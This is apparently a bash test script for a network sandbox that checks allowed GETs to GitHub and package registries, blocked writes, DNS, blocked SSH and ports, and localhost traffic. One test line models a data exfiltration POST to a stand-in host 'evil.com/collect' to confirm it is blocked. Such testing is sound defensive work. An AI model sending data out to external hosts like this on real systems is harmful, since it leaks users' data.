#!/bin/bash
# Test cases for network sandbox

run_tests() {
    echo ""
    echo "========================================"
    echo "HTTP Policy Tests"
    echo "========================================"

    # GitHub - GET allowed
    test_http_allow "GitHub web GET" GET "https://github.com"
    test_http_allow "GitHub API GET /users" GET "https://api.github.com/users/octocat"
    test_http_allow "GitHub API GET /repos" GET "https://api.github.com/repos/torvalds/linux"

    # GitHub - POST blocked
    test_http_block "GitHub API POST /gists (blocked)" POST "https://api.github.com/gists"
    test_http_block "GitHub API PUT (blocked)" PUT "https://api.github.com/repos/test/test"

    # Package registries - GET allowed
    test_http_allow "npm registry GET" GET "https://registry.npmjs.org/express"
    test_http_allow "PyPI GET" GET "https://pypi.org/simple/"

    # Unknown domain - blocked
    test_http_block "Unknown domain (blocked)" GET "https://example.com"
    test_http_block "Exfiltration attempt (blocked)" POST "https://evil.com/collect"

    echo ""
    echo "========================================"
    echo "Non-HTTP Protocol Tests"
    echo "========================================"

    # DNS should work
    test_dns "DNS resolution works" "github.com"
    test_dns "DNS resolution works (google)" "google.com"

    # SSH should be blocked
    test_tcp_block "SSH blocked (github.com:22)" "github.com" 22
    test_tcp_block "SSH blocked (example.com:22)" "example.com" 22

    # Arbitrary ports blocked
    test_tcp_block "Arbitrary TCP blocked (example.com:9999)" "example.com" 9999

    echo ""
    echo "========================================"
    echo "Localhost Tests"
    echo "========================================"

    # Start a simple server inside the sandbox on localhost
    sandbox_exec bash -c 'echo "hello" | nc -l -p 18080 &' || true
    sleep 1

    # Should be able to connect to localhost inside sandbox
    if sandbox_exec bash -c 'echo "test" | nc -w 1 127.0.0.1 18080' &>/dev/null; then
        log_pass "Localhost communication works inside sandbox"
    else
        log_fail "Localhost communication inside sandbox"
    fi

    echo ""
    echo "========================================"
    echo "Results"
    echo "========================================"
    echo -e "Passed: ${GREEN}$PASSED${NC}"
    echo -e "Failed: ${RED}$FAILED${NC}"
    echo -e "Skipped: ${YELLOW}$SKIPPED${NC}"
    echo ""

    if [[ $FAILED -gt 0 ]]; then
        echo -e "${RED}Some tests failed!${NC}"
        return 1
    else
        echo -e "${GREEN}All tests passed!${NC}"
        return 0
    fi
}
